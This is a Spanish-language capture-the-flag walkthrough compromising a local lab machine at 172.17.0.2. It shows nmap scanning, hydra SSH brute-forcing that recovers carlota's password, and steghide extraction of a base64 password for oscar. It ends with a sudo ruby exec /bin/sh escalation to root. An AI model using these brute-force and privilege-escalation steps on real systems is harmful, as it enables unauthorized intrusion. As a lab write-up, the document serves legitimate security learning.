# Enumeracion de puertos y servicios
nmap -Pn -n -sS -p- -sV --script vuln --min-rate 2500 -oN nmap 172.17.0.2

puerto 22 ssh
puerto 80 apache

Revisamos la web levantada con apache conseguimos 2 posibles usuarios, juan y carlota

primero fuzzeamos la web e inspeccionamos el codigo fuente
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 40 -x php,txt,html,py,sh -o gobuster

no sonseguimos nada asi que vamos aplicar fuerza bruta con hydra al servicio ssh con los 2 posibles usuarios: juan y carlota

hydra -l juan -P /home/darks/Desktop/Kali/diccionarios/rockyou.txt ssh://172.17.0.2		| no conseguimos nada
hydra -l carlota -P /home/darks/Desktop/Kali/diccionarios/rockyou.txt ssh://172.17.0.2		| conseguimos la clave

login: carlota   password: babygirl

nos conectamos via ssh a carlota, hacemos tratamiento de la tty y buscamos binarios de los que podemos abusar para escalar privilegios

sudo -l						| no obtenemos nada
find / -perm -4000 2>/dev/null			| nada, sin resultados

buscando entre los directorios conseguimos una imagen y para inspeccionar la imagen nos la vamos a llevar a nuestro equipo local

python3 -m http.server				| levantamos un servidor python por el puerto 8000
curl -O http://172.17.0.2:8000/imagen.jpg	| desde el equipo atacante nos traemos la imagen para inspeccionarla
steghide --info imagen.jpg			| inspeccionamos la imagen en busca de elementos ocultos
resultado:
___________________________________________________________________________________________________________________________________________________
"imagen.jpg":
  format: jpeg
  capacity: 2.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "secret.txt":
    size: 25.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
____________________________________________________________________________________________________________________________________________________

aqui observamos que contine un archivo txt embebido asi que procedemos a extraer dicho archivo

steghide --extract -sf imagen.jpg				| extraemos el archivo txt oculto en la imagen

al leer el archivo secret.txt parece estar codificado asi que probaremos con base32 y luego con base64

base32 -d secret.txt			| parece que no, provaremos con base64 a ver que tal resulta
base64 -d secret.txt			| aqui si obtenermos lo que parece ser una resultado
base64 -d secret.txt > passwd		| almacenamos el valor obtenido en un archivo 

ahora vamos a revisar cuales son los demas usuarios del sistema

cat /etc/passwd			| conseguimos 2 usuarios mas: ubuntu y oscar
su ubuntu			| provamos la posible clave contra el user ubuntu y no es valida
su oscar			| aqui si se valido, por lo que habiamos conseguido fue la clave del user oscar
script /dev/null -c bash	| tratamiento de la tty

ahora buscamos elevar privilegios desde el usuario oscar

sudo -l							| conseguimos el binario: /usr/bin/ruby
searchbins -b ruby -f shell				| para buscar como abusar del binario y elevar privilegios: | ruby -e 'exec "/bin/sh"'
sudo -u root /usr/bin/ruby -e 'exec "/bin/sh"'		| elevamos privilegios a root
script /dev/null -c bash				| tratamos la tty y pacapummmm pa dentro!!!!

	maquina vulnerada 100% ;)
